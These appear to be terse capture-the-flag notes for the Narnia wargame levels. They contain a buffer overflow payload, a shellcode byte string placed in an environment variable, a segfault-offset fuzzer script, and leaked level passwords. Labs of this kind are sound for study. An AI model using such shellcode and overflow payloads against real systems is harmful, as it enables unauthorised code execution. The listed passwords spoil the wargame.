# Python 3
```python
import struct
import sys

pad = b'\x41' * 20
sh = struct.pack("<L",0xdeadbeef)
out = pad + sh
sys.stdout.buffer.write(out)
```
- narnia1:eaa6AjYMBB

# Narnia 2
```bash
Envirment variable needs to be injected with shellcode.
Shellcode working for this one is:
http://shell-storm.org/shellcode/files/shellcode-607.html
EGG=$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
```
- narnia2:Zzb6MIyceT

# Narnia 3
```python
import subprocess

def execute_narnia2_with_argument(argument):
    try:
        # Run the narnia2 program with the specified argument
        result = subprocess.run(["/narnia/narnia2", argument], capture_output=True, text=True, check=True)

        # Check if the output contains "Segmentation fault"
        if "Segmentation fault" in result.stdout:
            return True
        else:
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return True

def find_segmentation_fault():
    # Start with one character "A" in the argument
    load_argument = "A"
    counter = 1

    while True:
        if execute_narnia2_with_argument(load_argument):
            print(f"Segmentation fault detected with argument: {counter}")
            # Segmentation fault occurred, break the loop
            break
        else:
            # No segmentation fault, increase the argument
            load_argument += "A"
            counter += 1

if __name__ == "__main__":
    find_segmentation_fault()
```

SIZE = 132

